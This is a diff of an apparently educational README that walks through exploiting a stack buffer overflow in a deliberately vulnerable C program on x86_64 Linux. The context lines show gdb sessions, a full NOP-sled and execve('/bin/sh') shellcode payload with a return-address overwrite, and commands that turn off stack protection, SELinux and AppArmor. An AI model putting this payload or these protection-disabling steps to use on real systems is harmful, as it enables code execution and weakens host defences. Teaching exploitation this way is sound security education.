@@ -10,7 +10,7 @@ Our automatic variables will be placed in the stack region with function call pa
 Our dynamic memory will be loeaded into the heap, that is for mallocs, etc.\
 We are going to be fousing only on stack vulnerabilites.
 
-We will need some dependencies:
+#### We will need some dependencies: ####
 ```
 sudo apt-get install gcc gdb
 ```
@@ -18,7 +18,7 @@ sudo apt-get install gcc gdb
 We asume that we have _python2.7_ as command python installed beacuse we are going to use _"\xHH"_ for escaping bytes and python3 doesnt handle them very well. Blame _utf8_ by default in this thing _"\xHH"_ in python3.\
 We asume the target system fo the reader is a _linux box x86_64_, in other sistems should follow throught this readme with some minor modifications by the reader
 
-Lets begin with a innocent program
+#### Lets begin with a innocent program ####
 ```
 #include<stdio.h>
 #include<string.h>
@@ -31,17 +31,17 @@ int main(int argc, char** argv) {
 ```
 What our innocent program does is: it initializes a static variable of type char of size 500 and then tries to copy a string from command line. Nothing fancy.
 
-Lets compile it:
+#### Lets compile it: ####
 ```
 gcc vuln.c -o vuln
 ```
 
-Attempting execution with a simple string such as 'hello' returns no errors:
+#### Attempting execution with a simple string such as 'hello' returns no errors: ####
 ```
 $ ./vuln hello
 ```
 
-Now if we send more than what we defined in our buffer:
+#### Now if we send more than what we defined in our buffer: ####
 ```
 $ ./vuln $(python -c 'print "\x41" * 524 ')
 Segmentation fault
@@ -49,7 +49,7 @@ Segmentation fault
 
 This means that we overrun the buffer.
 
-Lets retry this in the GDB debuger:
+#### Lets retry this in the GDB debuger: ####
 
 ```
 $ gdb vuln
@@ -58,7 +58,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x00007f0041414141 in ?? ()
 ```
 
-Now lets check the registers:
+#### Now lets check the registers: ####
 
 ```
 (gdb) info reg
@@ -71,7 +71,7 @@ This is our powerfull weapon becuse if we can control the _RIP_ register we can 
 The register _RSP_ point to the top of the current stack frame.\
 We will need to remember this value for later.
 
-_Lets Introduce the nop-sled:_
+#### _Lets Introduce the nop-sled:_ ####
 
 The _NOP_ instruction tells the CPU to do nothing and move to the next instruction.\
 The _NOP-sled_ is like: picture Boba Fet falling into the Sarlacc pit.\
@@ -79,7 +79,7 @@ Anywhere we land into the middle of a _NOP-sled_ we end up in the same place.\
 And in the end of the _NOP-sled_ we are going to put our shellcode.\
 Then our main idea is to put a big enought _NOP-sled_ that takes almost all the buffer up to almost the address where _RIP_ is.
 
-Again we run our innocent program with a bunch of _NOPs_:
+#### Again we run our innocent program with a bunch of _NOPs_: ####
 ```
 (gdb) run $(python -c 'print "\x90" * 524 ')
 Program received signal SIGSEGV, Segmentation fault.
@@ -106,7 +106,7 @@ Its asm code is:
   16:   0a                      .byte 0x
 ```
 
-Appending it and executing our exploit again:
+#### Appending it and executing our exploit again: ####
 ```
 (gdb) run $(python -c 'print "\x90" * 524 + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"  ')
 Program received signal SIGSEGV, Segmentation fault.
@@ -138,7 +138,7 @@ This can vary from system to system distributions and kernels.\
 In other cases we need to adjust only the last byte of the address like: _(RSP - **our_choosen_value**) < 518_.\
 We also need to substract the payload from the _NOP-sled_, the payload is 23 bytes so 524-23.
 
-Lets hit it again:
+#### Lets hit it again: ####
 ```
 (gdb) run $(python -c 'print "\x90" * (524-23) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"  ')
 Program received signal SIGSEGV, Segmentation fault.
@@ -150,14 +150,14 @@ For last we need to add our rip address that is going to be overwriten:\
 witch is **0x7fffffffdead** and in the _x86_64_ machine endianess:\
 We are going to add it more than one time because we are overwriting registers in ram so we dont know where exactly they are we only kknow that we need to be aligned in order for it to work. And we need to substract it from our nop-sled to not overshoot.
 
-Lets try:
+#### Lets try: ####
 ```
 (gdb) run $(python -c 'print "\x90" * (524-23-30) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
 Program received signal SIGSEGV, Segmentation fault.
 0xffffffdead050f99 in ?? ()
 ```
 
-We got very close:
+#### We got very close: ####
 
 **0xffffffdead050f99** is not the address we wanted to **0x7fffffffdead**\
 **0x7fffffffdead** is our return address in the middle of the nop-sled wen we overflow the RIP register wil point to this address and then the exploit begins.
@@ -179,7 +179,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 But why didn't our exploit worked at all?
 
-Lets inspect our _RIP_:
+#### Lets inspect our _RIP_: ####
 
 ```
 0x00007fffffffdead in ?? ()
@@ -197,7 +197,7 @@ So we need to recompile again our inocent code disabling the stack execution pro
 gcc -z execstack  -g -fno-inline -fno-stack-protector -fno-pie -O0  vuln.c -o vuln
 ```
 
-Lets hit it one more time
+#### Lets hit it one more time: ####
 ```
 gdb vuln
 (gdb) run $(python -c 'print "\x90" * (524-22-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
@@ -205,7 +205,7 @@ $
 ```
 Holy shiet, we have our first shell executed from a an expoit!!!
 
-Lets try one more thing, lets execute it outside gdb:
+#### Lets try one more thing, lets execute it outside gdb: ####
 
 ```
 ./vuln $(python -c 'print "\x90" * (524-22-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
@@ -225,7 +225,8 @@ Also we may need to disable selinux and apparmor in order for this exploit to wo
 sudo setenforce 0
 sudo systemctl stop apparmor
 ```
-And for last time:
+
+#### And for last time: ####
 ```
 ./vuln $(python -c 'print "\x90" * (524-22-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
 $
